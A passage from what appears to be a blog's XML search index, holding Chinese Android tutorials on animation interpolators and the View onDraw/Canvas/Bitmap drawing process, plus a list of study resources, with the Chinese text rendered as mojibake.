çš„æ˜¯æœ€ç»ˆçš„åŠ¨ç”»è¿›åº¦ï¼Œæˆ‘ä»¬å¿…é¡»å¦‚å®žåœ°æŒ‰ç…§è¿™ä¸ªè¿›åº¦æ”¹å˜æˆ‘ä»¬çš„å±žæ€§ï¼Œæ‰€ä»¥éœ€è¦å°†result = x0 + t * (x1 - x0)`è¿™æ ·çš„å½¢å¼åæ˜ åˆ°æˆ‘ä»¬è‡ªå·±çš„å¯¹è±¡ä¸Šã€‚ è‡ªå®šä¹‰äº†TypeEvaluatorä»¥åŽå°±å¯ä»¥ä½œä¸ºå‚æ•°ä½¿ç”¨åœ¨ä¸Šé¢çš„obObject()å·¥åŽ‚æ–¹æ³•ä¸­äº†ã€‚ æ’è¡¥ç»†åˆ†å™¨(Interpolators)ä¸‹é¢ä»‹ç»ä½¿ç”¨ValueAnimatoræŽ§åˆ¶å€¼å˜åŒ–è¿‡ç¨‹ä¸­æœ€ä¸ºé‡è¦çš„ä¸€ä¸ªæ¦‚å¿µï¼šæ’è¡¥ç»†åˆ†å™¨(Interpolators)ã€‚ å®ƒå®žé™…ä¸Šæ˜¯ä¸€ä¸ªå…³äºŽæ—¶é—´çš„å‡½æ•°ï¼Œ æ ¹æ®æ—¶åˆ»çš„ä¸åŒæ¥è¿”å›žä¸åŒçš„å€¼ï¼Œè¿›è€Œæ¥æŽ§åˆ¶æœ€åŽçš„è¾“å‡ºçš„å€¼ã€‚é‚£ä¹ˆå®ƒæ˜¯å¦‚ä½•è¡¨ç¤ºçš„å‘¢ï¼Ÿ ç³»ç»Ÿä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ç³»åˆ—é¢„ç½®çš„Interpolatorsï¼Œä»¥è¾ƒå¸¸ç”¨çš„LinearInterpolaterä¸ºä¾‹ï¼Œé¡¾åæ€ä¹‰ï¼Œå®ƒæ˜¯ä¸€ä¸ªçº¿æ€§çš„æ’è¡¥ç»†åˆ†å™¨ï¼Œæ„å‘³ç€è¾“å…¥ä¸Žè¾“å‡ºå‘ˆçº¿æ€§å…³ç³»ï¼š 123public float getInterpolation(float input) &#123; return input;&#125; è¾“å…¥è¾“å‡ºçš„å…³é”®å‡½æ•°å°±æ˜¯è¿™ä¸ªgetInterpolation()äº†ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œå‚æ•°ä¸Žè¿”å›žå€¼éƒ½æ˜¯floatç±»åž‹ï¼Œinputçš„å€¼åœ¨0-1ä¹‹é—´ï¼Œç»“åˆå‰é¢ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“ç†è§£ï¼Œè¿™ä¸ªinputå°±æ˜¯ä¸€ä¸ªä»¥0-1ä¹‹é—´çš„å°æ•°è¡¨ç¤ºçš„è¿‡åŽ»çš„æ—¶é—´å€¼ï¼Œä¾‹å¦‚æ•´ä¸ªåŠ¨ç”»æ˜¯1000msï¼Œå½“inputä¸º0.25çš„æ—¶å€™æ„å‘³ç€çŽ°åœ¨çš„æ—¶é—´è¿‡åŽ»äº†250msã€‚ è€Œè¿”å›žå€¼å°±æ˜¯ç»è¿‡æˆ‘ä»¬çš„è½¬æ¢ï¼Œè¡¨ç¤ºå‡ºçš„åŠ¨ç”»åº”è¯¥è¿›è¡Œçš„æ—¶é—´çš„æ¯”ä¾‹ï¼Œè¿™é‡Œç”±äºŽæ˜¯çº¿æ€§çš„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æŽ¥è¿”å›žinputï¼Œè¿™ä¸ªå€¼æœ€åŽä¼šåˆ°å“ªé‡Œå‘¢ï¼Ÿè‡ªç„¶å°±æ˜¯ç»™æˆ‘ä»¬å‰é¢ä»‹ç»çš„TypeEvaluatorã€‚ä¸‹é¢ä¸€æ®µæºç å±•ç¤ºäº†è¿™ä¸ªè¿‡ç¨‹ï¼š 12345if (mInterpolator != null) &#123; fraction = mInterpolator.getInterpolation(fraction);&#125;return mEvaluator.evaluate(fraction, mFirstKeyframe.getValue(), mLastKeyframe.getValue()); ä½œä¸ºgetInterpolation()å‚æ•°çš„fractionä»£è¡¨ç€è¿‡åŽ»çš„æ—¶é—´æ¯”ä¾‹ï¼Œè¿™é‡Œè°ƒç”¨æˆ‘ä»¬è®¾ç½®çš„Interpolatoræ¥æ›´æ–°è¿™ä¸ªfractionï¼ŒçŽ°åœ¨è¿™ä¸ªfractionè¡¨ç¤ºçš„å°±æ˜¯åŠ¨ç”»å·²ç»è¿›è¡Œçš„æ¯”ä¾‹ï¼Œä¸‹ä¸€æ­¥å°±è¦æ ¹æ®å®ƒæ¥èŽ·å–å¯¹åº”çš„å¯¹è±¡å€¼ï¼ˆè°ƒç”¨äº†æˆ‘ä»¬ä¹‹é—´è°ˆåˆ°è¿‡çš„evaluate()æ–¹æ³•ï¼Œè¿™é‡Œçš„KeyFrameçš„æ¦‚å¿µä¼šåœ¨ä¹‹åŽçš„åšå®¢è®²åˆ°ï¼‰ï¼ŒåŽé¢çš„ä¸¤ä¸ªå‚æ•°å°±æ˜¯ä¼ é€’ç»™evaluateçš„èµ·å§‹ä¸Žç»“æŸèŒƒå›´ã€‚ æœ€ç»ˆï¼Œæˆ‘ä»¬å°±èŽ·å¾—äº†ä¸€ä¸ªæŒ‰ç…§æˆ‘ä»¬è®¾å®šçš„Interpolatorè¿”å›žçš„åŠ¨ç”»å±žæ€§å€¼ã€‚ å¦‚æžœæƒ³è¦å®žçŽ°åŠ é€Ÿæ•ˆæžœå‘¢ï¼ŸAndroidåŒæ ·ä¸ºæˆ‘ä»¬æä¾›äº†çŽ°æˆçš„AccelerateInterpolatorï¼š 1234567public float getInterpolation(float input) &#123; if (mFactor == 1.0f) &#123; return input * input; &#125; else &#123; return (float)Math.pow(input, mDoubleFactor); &#125;&#125; åŒæ ·å¾ˆç®€æ´ï¼Œè¿™é‡Œç”¨åˆ°äº†mFactorä¸ŽmDoubleFactoråˆ†åˆ«è¡¨ç¤ºæˆ‘ä»¬åœ¨æž„é€ å‡½æ•°é‡Œé¢è®¾ç½®çš„æŒ‡æ•°å€¼ï¼š 1234public AccelerateInterpolator(float factor) &#123; mFactor = factor; mDoubleFactor = 2 * mFactor;&#125; å¦‚æžœæˆ‘ä»¬è®¾ç½®çš„ä¸º1ï¼Œä¼šè¿”å›žinputçš„å¹³æ–¹ï¼Œå…¶ä»–å€¼åˆ™ä¼šè¿”å›žinputçš„mDoubleFactoræ¬¡æ–¹ï¼Œä½¿å¾—åŠ¨ç”»å±žæ€§å¯ä»¥ä»¥ä¸åŒçš„å‡½æ•°æ›²çº¿å½¢å¼å˜åŒ–ã€‚ å¦‚æžœæˆ‘ä»¬è¦å®žçŽ°è‡ªå·±çš„Interpolatorå‘¢ï¼Ÿåªéœ€è¦å®žçŽ°TimeInterpolatoræŽ¥å£ï¼Œè¿™ä¸ªæŽ¥å£åªéœ€è¦æˆ‘ä»¬å®žçŽ°ä¸€ä¸ªgetInterpolationæ–¹æ³•ã€‚æˆ‘ä»¬å¯ä»¥æ ¹æ®inputå€¼è¿”å›žä¸åŒçš„å€¼æ¥è¿”å›žä¸åŒçš„å€¼è¡¨ç¤ºåŠ¨ç”»çš„è¿›åº¦ã€‚ æ³¨æ„ï¼šè¿”å›žå€¼çš„èŒƒå›´ä¸ä¸€å®šè¦åœ¨0-1ä¹‹é—´ï¼Œå°äºŽ0æˆ–å¤§å°1çš„å€¼å¯ä»¥è¡¨ç¤ºè¶…å‡ºé¢„è®¾èŒƒå›´çš„ç›®æ ‡å€¼ã€‚ è¿™ç¯‡åšå®¢åˆ°æ­¤ç»“æŸï¼Œåœ¨ä¸‹ä¸€ç¯‡åšå®¢ä¸­å°†ä¼šä»¥ä¸€ä¸ªç»˜åˆ¶è‡ªç”±è½ä½“çš„å¼¹è·³å°çƒçš„ç¤ºä¾‹æ¥æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨Animatorä¸Žä»‹ç»å®ƒçš„å›žè°ƒå‡½æ•°ã€‚]]></content>
      <categories>
        <category>Android</category>
        <category>UI</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>UI</tag>
        <tag>Animation</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[å­¦ä¹ èµ„æºæ”¶é›†]]></title>
    <url>%2F2017%2F03%2F25%2Fresource_general%2F</url>
    <content type="text"><![CDATA[æŠ€æœ¯åˆ†ç±» èµ„æºç±»åž‹ æ ‡é¢˜ é“¾æŽ¥ ç®€ä»‹ Cè¯­è¨€ ä¹¦ç± C Primer Plus é“¾æŽ¥ Cè¯­è¨€æŽ¨èå…¥é—¨ä¹¦ç± ç®—æ³• ç½‘ç«™ ç¼–ç¨‹ç»ƒä¹ /ç®—æ³•ç»ƒä¹ /é¢è¯•åˆ·é¢˜ é“¾æŽ¥ åœ¨çº¿ç¼–ç¨‹åŠæµ‹è¯•ç½‘ç«™ï¼Œä½“éªŒè‰¯å¥½ï¼Œé¢˜ç›®ä¼˜ç§€ï¼Œä»Žæ˜“åˆ°éš¾åš æ•°æ®ç»“æž„ä¸Žç®—æ³•åˆ†æž ä¹¦ç± æ•°æ®ç»“æž„ä¸Žç®—æ³•åˆ†æžï¼šCè¯­è¨€æè¿° ç¬¬2ç‰ˆ é“¾æŽ¥ æ•°æ®ç»“æž„ä¸Žç®—æ³•åˆ†æžæƒå¨ä¹¦ç± ç®—æ³• ä¹¦ç± ç®—æ³• ç¬¬4ç‰ˆ é“¾æŽ¥ ç®—æ³•å­¦ä¹ æŽ¨èä¹¦ç±ï¼Œå¼ºçƒˆå»ºè®®é…åˆç½‘è¯¾(é“¾æŽ¥)è¿›è¡Œå­¦ä¹  Java ä¹¦ç± Javaæ ¸å¿ƒæŠ€æœ¯ å·1ï¼šåŸºç¡€çŸ¥è¯†ï¼ˆåŽŸä¹¦ç¬¬10ç‰ˆï¼‰ é“¾æŽ¥ Javaè¯­è¨€æŽ¨èå…¥é—¨ä¹¦ç± Java ä¹¦ç± Effective Javaä¸­æ–‡ç‰ˆï¼ˆç¬¬2ç‰ˆï¼‰ é“¾æŽ¥ Javaè¯­è¨€æŽ¨èè¿›é˜¶ä¹¦ç± Java ä¹¦ç± Javaæ ¸å¿ƒæŠ€æœ¯ å·2ï¼šé«˜çº§ç‰¹æ€§ï¼ˆåŽŸä¹¦ç¬¬9ç‰ˆï¼‰ é“¾æŽ¥ Javaè¯­è¨€æŽ¨èè¿›é˜¶ä¹¦ç± ç”Ÿæ´» ç½‘ç«™ V2EX é“¾æŽ¥ ç¨‹åºå‘˜ç”Ÿæ´» è®¡ç®—æœºç½‘ç»œ ä¹¦ç± è®¡ç®—æœºç½‘ç»œï¼ˆç¬¬5ç‰ˆï¼‰ é“¾æŽ¥ è®¡ç®—æœºç½‘ç»œåŸºç¡€æŽ¨èä¹¦ç± æ“ä½œç³»ç»Ÿ ä¹¦ç± çŽ°ä»£æ“ä½œç³»ç»Ÿï¼ˆåŽŸä¹¦ç¬¬3ç‰ˆï¼‰ é“¾æŽ¥ æ“ä½œç³»ç»ŸæŽ¨èä¹¦ç± è®¡ç®—æœºç½‘ç»œ ä¹¦ç± TCP/IPè¯¦è§£ï¼šå·1+å·2+å·3 é“¾æŽ¥ è®¡ç®—æœºç½‘ç»œè¿›é˜¶æŽ¨èä¹¦ç± Linux å…¬å¼€è¯¾ Linux å…¥é—¨åŸºç¡€ é“¾æŽ¥ Linux å…¥é—¨åŸºç¡€ Android åšå®¢ Androidå­¦ä¹ è·¯çº¿æŒ‡å— é“¾æŽ¥ Androidå¼€å‘è‰ºæœ¯æŽ¢ç´¢ä¸€ä¹¦çš„ä½œè€…åˆ†äº«çš„å®‰å“å­¦ä¹ è·¯çº¿ï¼Œä¾›å‚è€ƒ Android ä¹¦ç± ç¬¬ä¸€è¡Œä»£ç  Android ç¬¬2ç‰ˆ é“¾æŽ¥ Androidå…¥é—¨æŽ¨èä¹¦ç± Android ä¹¦ç± å®‰å“Androidå¼€å‘è‰ºæœ¯æŽ¢ç´¢+Androidç¾¤è‹±ä¼ +æºç è®¾è®¡æ¨¡å¼è§£æž é“¾æŽ¥ Androidè¿›é˜¶å¿…è¯» è®¡ç®—æœºç³»ç»Ÿ ä¹¦ç± æ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿï¼ˆåŽŸä¹¦ç¬¬3ç‰ˆï¼‰ é“¾æŽ¥ ç†è§£è®¡ç®—æœºç³»ç»Ÿ æ±‡ç¼–è¯­è¨€ ä¹¦ç± æ±‡ç¼–è¯­è¨€ï¼ˆç¬¬3ç‰ˆï¼‰ é“¾æŽ¥ æ±‡ç¼–è¯­è¨€æŽ¨èä¹¦ç± æ±‡ç¼–è¯­è¨€ åšå®¢ ä¸Šé¢è¿™æœ¬ä¹¦çš„æ£€æµ‹ç‚¹ä¸Žå®žéªŒè§£æž é“¾æŽ¥ ä¸Šé¢è¿™æœ¬ä¹¦çš„æ£€æµ‹ç‚¹ä¸Žå®žéªŒè§£æžBy2015çº§é™ˆå¿—æµ© è§„èŒƒ ä¹¦ç± é‡æž„ æ”¹å–„æ—¢æœ‰ä»£ç çš„è®¾è®¡ é“¾æŽ¥ æ”¹å–„ä»£ç è´¨é‡çš„è¿›é˜¶ä¹¦ç± Java ä¹¦ç± æ·±å…¥ç†è§£Javaè™šæ‹Ÿæœºï¼šJVMé«˜çº§ç‰¹æ€§ä¸Žæœ€ä½³å®žè·µï¼ˆç¬¬2ç‰ˆï¼‰ é“¾æŽ¥ Javaæ·±å…¥å¿…è¯» Java ä¹¦ç± åŽç« ä¸“ä¸šå¼€å‘è€…ä¸›ä¹¦Â·Javaå¹¶å‘ç¼–ç¨‹å®žæˆ˜ é“¾æŽ¥ Javaå¹¶å‘ç¼–ç¨‹æŽ¨èä¹¦ç± è®¾è®¡æ¨¡å¼ ä¹¦ç± Oâ€™Reillyï¼šHead Firstè®¾è®¡æ¨¡å¼ï¼ˆä¸­æ–‡ç‰ˆï¼‰ é“¾æŽ¥ è®¾è®¡æ¨¡å¼æŽ¨èä¹¦ç± iOS ä¹¦ç± Objective-Cç¨‹åºè®¾è®¡ï¼ˆç¬¬6ç‰ˆï¼‰ é“¾æŽ¥ Objective-Cè¯­è¨€å…¥é—¨ä¹¦ç± iOS ä¹¦ç± Objective-CåŸºç¡€æ•™ç¨‹(ç¬¬2ç‰ˆ) é“¾æŽ¥ Objective-Cè¯­è¨€å…¥é—¨ä¹¦ç±â€™ iOS ä¹¦ç± Effective Objective-C 2.0ï¼šç¼–å†™é«˜è´¨é‡iOSä¸ŽOS Xä»£ç çš„52ä¸ªæœ‰æ•ˆæ–¹æ³• é“¾æŽ¥ Objective-Cä¸ŽiOSå¼€å‘æé«˜]]></content>
      <categories>
        <category>Resource</category>
      </categories>
      <tags>
        <tag>Resource</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android Viewç»˜åˆ¶ï¼ˆå››ï¼‰onDrawè¿‡ç¨‹ä¸ŽCanvas Bitmap]]></title>
    <url>%2F2017%2F03%2F12%2Fandroid_view_onDraw_canvas%2F</url>
    <content type="text"><![CDATA[draw()æ–¹æ³•ç»è¿‡å¯¹Viewçš„æµ‹é‡ä¸Žå¸ƒå±€è¿‡ç¨‹åŽï¼Œä¸‹é¢å°±åˆ°äº†çœŸæ­£çš„Viewç»˜åˆ¶çš„è¿‡ç¨‹äº†ã€‚è¿™ä¸ªè¿‡ç¨‹ä»Žè°ƒç”¨æ ¹Viewçš„draw()æ–¹æ³•å¼€å§‹ï¼šï¼ˆçœç•¥éƒ¨åˆ†ä»£ç ï¼‰ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public void draw(Canvas canvas) &#123; final int privateFlags = mPrivateFlags; final boolean dirtyOpaque = (privateFlags &amp; PFLAG_DIRTY_MASK) == PFLAG_DIRTY_OPAQUE &amp;&amp; (mAttachInfo == null || !mAttachInfo.mIgnoreDirtyState); mPrivateFlags = (privateFlags &amp; ~PFLAG_DIRTY_MASK) | PFLAG_DRAWN; /* * Draw traversal performs several drawing steps which must be executed * in the appropriate order: * * 1. Draw the background * 2. If necessary, save the canvas' layers to prepare for fading * 3. Draw view's content * 4. Draw children * 5. If necessary, draw the fading edges and restore layers * 6. Draw decorations (scrollbars for instance) */ // Step 1, draw the background, if needed int saveCount; if (!dirtyOpaque) &#123; drawBackground(canvas); &#125; // skip step 2 &amp; 5 if possible (common case) final int viewFlags = mViewFlags; boolean horizontalEdges = (viewFlags &amp; FADING_EDGE_HORIZONTAL) != 0; boolean verticalEdges = (viewFlags &amp; FADING_EDGE_VERTICAL) != 0; if (!verticalEdges &amp;&amp; !horizontalEdges) &#123; // Step 3, draw the content if (!dirtyOpaque) onDraw(canvas); // Step 4, draw the children dispatchDraw(canvas); // Overlay is part of the content and draws beneath Foreground if (mOverlay != null &amp;&amp; !mOverlay.isEmpty()) &#123; mOverlay.getOverlayView().dispatchDraw(canvas); &#125; // Step 6, draw decorations (foreground, scrollbars) onDrawForeground(canvas); // we're done... return; &#125; è¿™æ®µæºç æ¥è‡ªäºŽViewï¼Œè¿‡ç¨‹éžå¸¸æ¸…æ™°ï¼Œæ‰§è¡Œäº†ä»¥ä¸‹çš„æ­¥éª¤ï¼ˆå¦‚æžœéœ€è¦ï¼‰ï¼š 27-30è¡Œè¿›è¡Œåˆ¤æ–­æ˜¯å¦è·³è¿‡æ³¨é‡Šä¸­çš„ç¬¬2ã€5æ­¥ï¼Œé€šå¸¸æƒ…å†µè·³è¿‡ 22-24è¡Œï¼Œè¿›è¡ŒèƒŒæ™¯çš„ç»˜åˆ¶ 32è¡Œï¼Œè°ƒç”¨onDraw()æ–¹æ³•è¿›è¡Œè‡ªèº«çš„ç»˜åˆ¶ 35è¡Œï¼Œè°ƒç”¨dispatchDraw()æ–¹æ³•ï¼Œè¿›è¡Œå­Viewçš„ç»˜åˆ¶ï¼ˆè°ƒç”¨å­Viewçš„draw()æ–¹æ³•ï¼‰ï¼ŒåŒæ—¶ä¹Ÿè¡¨æ˜Žäº†å­Viewçš„ç»˜åˆ¶åœ¨è‡ªèº«ä¹‹åŽè¿™ä¸€é¡ºåº 43è¡Œï¼Œè¿›è¡Œå‰æ™¯çš„ç»˜åˆ¶ï¼Œä¸€èˆ¬ä¸ºè£…é¥°ç»„ä»¶ï¼Œå¦‚æ»šåŠ¨æ¡ç­‰ dispatchDraw()æ–¹æ³•onDraw()æ–¹æ³•å…ˆä¸è°ˆï¼Œçœ‹çœ‹dispatchDraw()æ–¹æ³•åšäº†ä»€ä¹ˆï¼Œä»¥ViewGroupä¸ºä¾‹ï¼š(çœç•¥éƒ¨åˆ†ä»£ç ) 12345678910111213@Overrideprotected void dispatchDraw(Canvas canvas) &#123; for (int i = 0; i &lt; childrenCount; i++) &#123; if ((transientChild.mViewFlags &amp; VISIBILITY_MASK) == VISIBLE || transientChild.getAnimation() != null) &#123; more |= drawChild(canvas, transientChild, drawingTime); &#125; &#125;&#125;protected boolean drawChild(Canvas canvas, View child, long drawingTime) &#123; return child.draw(canvas, this, drawingTime);&#125; ç®€å•æ¥çœ‹ï¼Œä¾æ¬¡è°ƒç”¨äº†å­Viewçš„draw()æ–¹æ³•ã€‚æ‰€ä»¥å¯¹äºŽæœ‰å­Viewçš„ViewGroupï¼Œ æˆ‘ä»¬éœ€è¦é‡å†™è¿™ä¸ªæ–¹æ³•æ¥å†³å®šå­Viewç»˜åˆ¶çš„é¡ºåºã€‚ Canvas Bitmap Surfaceé—´çš„è”ç³»èƒŒæ™¯ä¸Žå‰æ™¯ç»˜åˆ¶çš„è¿‡ç¨‹ä¸€èˆ¬ä¸ç”±æˆ‘ä»¬æŽ§åˆ¶ï¼Œè‡ªå®šä¹‰Viewæ—¶å…³é”®çš„å†…å®¹å°±åœ¨onDraw()æ–¹æ³•ä¸­ã€‚ ä½ å¯èƒ½å·²ç»å‘çŽ°ï¼Œåœ¨è¿™äº›Viewç»˜åˆ¶è¿‡ç¨‹ä¸­çš„å‡½æ•°éƒ½å…·æœ‰ä¸€ä¸ªå‚æ•°Canvasï¼Œè¿™ä¸ªCanvaså­—é¢æ„ä¹‰ä¸Šä¸ºç”»å¸ƒï¼Œé‚£å®ƒå®žé™…ä¸Šæ˜¯ä»€ä¹ˆï¼Œåˆåœ¨ç»˜åˆ¶è¿‡ç¨‹ä¸­èµ·ç€ä»€ä¹ˆæ ·çš„é‡è¦ä½œç”¨å‘¢ï¼Ÿ æˆ‘ä»¬å¯ä»¥æŠŠCanvasçœ‹ä½œæ˜¯ç³»ç»Ÿç»™äºˆæˆ‘ä»¬çš„ä¸€ä¸ªè™šæ‹Ÿçš„å¯¹è±¡ï¼Œæˆ–è€…è¯´æ˜¯æˆ‘ä»¬ç»˜åˆ¶å›¾å½¢çš„ä¸€ä¸ªä¸­ä»‹ï¼ŒCanvaså…·æœ‰ä¸€ç³»åˆ—çš„æ–¹æ³•å¯ä»¥ä¾›æˆ‘ä»¬è°ƒç”¨æ¥ç›´è§‚åœ°ç»˜åˆ¶å›¾å½¢ï¼Œæˆ‘ä»¬å¯¹äºŽCanvasçš„æ‰€æœ‰æ“ä½œéƒ½ä¼šè¢«ç³»ç»Ÿå¤„ç†ä»Žè€Œåæ˜ åœ¨å±å¹•ä¸Šè€Œä¸ç”¨æˆ‘ä»¬åŽ»æ‰‹åŠ¨åœ°å†³å®šå“ªä¸€ä¸ªåƒç´ åº”è¯¥æ˜¾ç¤ºä»€ä¹ˆé¢œè‰²ã€‚ åœ¨CanvasèƒŒåŽåˆ™æ˜¯ä¸€ä¸ªBitmapå¯¹è±¡ï¼Œæˆ‘ä»¬çš„ç»˜åˆ¶å®žé™…ä¸Šä¼šåæ˜ åœ¨è¿™ä¸ªBitmapä¸Šå†äº¤ç”±ç³»ç»Ÿæ¥æ˜¾ç¤ºã€‚å¦‚æžœæˆ‘ä»¬éœ€è¦è‡ªå·±åˆ›å»ºä¸€ä¸ªCanvasï¼Œæˆ‘ä»¬å¿…é¡»åˆ›å»ºä¸€ä¸ªBitmapå¯¹è±¡ä½œä¸ºCanvasçš„æž„é€ å‚æ•°ã€‚ä¾‹å¦‚ï¼š 12Bitmap b = Bitmap.createBitmap(100, 100, Bitmap.Config.ARGB_8888);Canvas c = new Canvas(b); è¿™æ ·è¿™ä¸ªCanvaså°±ä¼šåœ¨æŒ‡å®šçš„Bitmapä¸Šè¿›è¡Œç»˜åˆ¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡Canvasçš„drawBitmap()æ–¹æ³•æ¥åœ¨æŒ‡å®šçš„Bitmapä¸Šç»˜åˆ¶ã€‚ é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼ŒonDraw()æ–¹æ³•ç»™æˆ‘ä»¬æä¾›çš„è¿™ä¸ªCanvasæ˜¯ä»Žå“ªé‡Œæ¥çš„ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬å¯¹å®ƒçš„æ“ä½œå¯ä»¥åæ˜ åˆ°å±å¹•ä¸Šï¼Ÿä¸‹é¢è¿™å¼ å›¾ä¾¿äºŽæˆ‘ä»¬åŽ»äº†è§£è¿™ä¸ªè¿‡ç¨‹ï¼š å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬çš„å±å¹•è¢«åˆ†ä¸ºäº†å‡ ä¸ªWindowï¼Œæ¯ä¸€ä¸ªWindowéƒ½æœ‰ç€è‡ªå·±çš„Surfaceï¼ŒSurfaceå…·æœ‰ä¸¤çº§ç¼“å­˜ï¼Œæ¯ä¸ªç¼“å­˜ä¸­å­˜æ”¾ç€å°†è¦æ˜¾ç¤ºåœ¨å±å¹•ä¸Šçš„åƒç´ æ•°æ®ï¼Œè€Œå½“æˆ‘ä»¬æƒ³è¦åˆ·æ–°å±å¹•æ˜¾ç¤ºæ–°çš„å†…å®¹æ—¶ï¼Œå¯¹åº”çš„Surfaceå°†ä¼šè¯»å–ç¼“å­˜ä¸­çš„æ•°æ®æ¥è¿›è¡Œæ›´æ–°ã€‚ onDraw()æ–¹æ³•ä¸­çš„canvaså°±æ˜¯åœ¨ä¸€ä¸ªSurfaceæ˜¾ç¤ºå®Œæ¯•ï¼Œå°†è¿™ä¸ªSurfaceé”å®šæ—¶ç”±å®ƒè¿”å›žçš„ï¼Œåœ¨è¿™ä¸ªcanvasä¸Šè¿›è¡Œçš„æ“ä½œå°±å¯ä»¥åœ¨ä¸‹ä¸€æ¬¡åˆ·æ–°å±å¹•æ—¶æ˜¾ç¤ºï¼Œä½†æ˜¯å®žé™…ä¸Šå¹¶ä¸æ˜¯ç”±canvasç›´æŽ¥å†™æ•°æ®åˆ°å®ƒçš„Surfaceç¼“å­˜ä¸­ï¼Œè¿™ä¸­é—´è¿˜æœ‰ä¸€ä¸ªå¯¹è±¡å°±æ˜¯æˆ‘ä»¬ä¹‹å‰æåˆ°çš„Bitmapï¼ŒBitmapå‚¨å­˜ç€çš„æ­£æ˜¯åƒç´ ä¿¡æ¯ï¼Œè€ŒSurfaceè¿”å›žçš„canvasä¸­å«æœ‰çš„å°±æ˜¯ä¸€ä¸ªæŒ‡å‘Surfaceç¼“å­˜çš„Bitmapã€‚ æ¢³ç†ä¸€ä¸‹æ•´ä¸ªè¿‡ç¨‹ï¼Œæˆ‘ä»¬éœ€è¦åšçš„æ˜¯æ“ä½œè¿™ä¸ªå°è£…äº†ä¸€ç³»åˆ—ç»˜å›¾æ–¹æ³•çš„canvasï¼Œcanvaså°†æ“ä½œåæ˜ åˆ°å†…å«çš„Bitmapä¸Šï¼ŒBitmapå°†æ•°æ®åæ˜ ç»™Surfaceçš„ç¼“å­˜ï¼ŒSurfaceåœ¨ä¸‹ä¸€æ¬¡åˆ·æ–°æ—¶è¯»å–ç¼“å­˜ä¸­çš„å†…å®¹å¹¶æ˜¾ç¤ºåˆ°å±å¹•ä¸Šã€‚ è¿™é‡Œè¿˜åº”æ³¨æ„çš„æ˜¯æ¯ä¸ªWindowæœ‰ä¸”ä»…æœ‰ä¸€ä¸ªå•ç»§æ‰¿ï¼ˆå³åªæœ‰ä¸€ä¸ªæ ¹ï¼‰çš„Viewæ ‘ï¼ŒViewå°†ä¼šå°†Surfaceè¿”å›žçš„canvaså‘ä¸‹ä¼ é€’æ¥è®©å­Viewä¾æ¬¡å®Œæˆéƒ¨åˆ†åŒºåŸŸçš„ç»˜åˆ¶ã€‚ å¼„æ¸…æ¥šè¿™ä¸ªcanvasçš„æ¥æºä¹‹åŽï¼Œæˆ‘ä»¬å°±å¯ä»¥æ”¾å¿ƒåœ°åœ¨ç”¨å®ƒæ¥â€œä½œç”»â€äº†ã€‚ onDraw()æ–¹æ³•åœ¨onDraw()æ–¹æ³•ä¸­æˆ‘ä»¬å¯ä»¥å¯¹æ–¹æ³•å‚æ•°æä¾›çš„canvasè¿›è¡Œæ“ä½œï¼Œç»˜åˆ¶å„ç§è‡ªå®šä¹‰çš„å›¾å½¢ã€‚ æˆ‘ä»¬å¯ä»¥é€‰æ‹©ä¸€ä¸ªçŽ°æœ‰çš„Viewä½œä¸ºè‡ªå®šä¹‰Viewçš„çˆ¶ç±»ï¼Œåœ¨å®ƒçš„onDraw()æ–¹æ³•ä¸­ä¸€å®šè¦è°ƒç”¨super.onDraw()æ¥ä»¤å®ƒç»˜åˆ¶æœ¬æ¥çš„ç»„ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è°ƒç”¨super.onDraw()ä¹‹å‰æˆ–ä¹‹åŽæ’å…¥æˆ‘ä»¬è‡ªå·±çš„ä»£ç ï¼Œè¿™å–å†³ä½ å¯¹ç»˜åˆ¶é¡ºåºçš„éœ€è¦ã€‚ æ³¨æ„æœ‰äº›Viewå¦‚Linearlayouté»˜è®¤æ˜¯ä¸ç»˜åˆ¶è‡ªå·±çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä»¬å¹¶ä¸ä¼šè°ƒç”¨onDraw()æ–¹æ³•ï¼Œå½“æˆ‘ä»¬éœ€è¦ç»§æ‰¿è¿™ç±»Viewæ¥è¿›è¡Œè‡ªå®šä¹‰å¹¶è¿›è¡Œç»˜åˆ¶çš„è¯éœ€è¦è°ƒç”¨setWillNotDraw(false);ã€‚å¯ä»¥åœ¨onMeasure()æ–¹æ³•ä¸­è°ƒç”¨ã€‚ å¦ä¸€ç§æ–¹å¼æ˜¯ç»§æ‰¿äºŽViewï¼Œå¯ä»¥æ›´ä¸ºè‡ªç”±åœ°è®¢åˆ¶å„ç§è¡Œä¸ºã€‚ Canvasä¸­å°è£…äº†éžå¸¸å¤šçš„æ–¹æ³•ï¼Œä¸‹é¢åˆ—ä¸¾ä¸€éƒ¨åˆ†ï¼š drawArc)(float left, float top, float right, float bottom, float startAngle, float sweepAngle, boolean useCenter, Paint paint)ï¼šç»˜åˆ¶æ¤­åœ† drawCircle)(float cx, float cy, float radius, Paint paint)ï¼šç»˜åˆ¶åœ†å½¢ drawColor)(int color)ï¼šå¯¹æ•´ä¸ªCanvaså¡«å……é¢œè‰² drawLine)(float startX, float startY, float stopX, float stopY, Paint paint)ï¼šç»˜åˆ¶ç›´çº¿ drawLines)(float[] pts, int offset, int count, Paint paint)ï¼šç»˜åˆ¶ä¸€ç³»åˆ—ç›´çº¿ drawPicture)(Picture picture, Rect dst)ï¼šç»˜åˆ¶ä¸€å¼ å›¾ç‰‡ drawPoint)(float x, float y, Paint paint)ï¼šç»˜åˆ¶ä¸€ä¸ªç‚¹ drawPoints)(float[] pts, int offset, int count, Paint paint)ï¼šç»˜åˆ¶ä¸€ç³»åˆ—ç‚¹ drawRect)(float left, float top, float right, float bottom, Paint paint)ï¼šç»˜åˆ¶çŸ©å½¢ drawRoundRect)(RectF rect, float rx, float ry, Paint 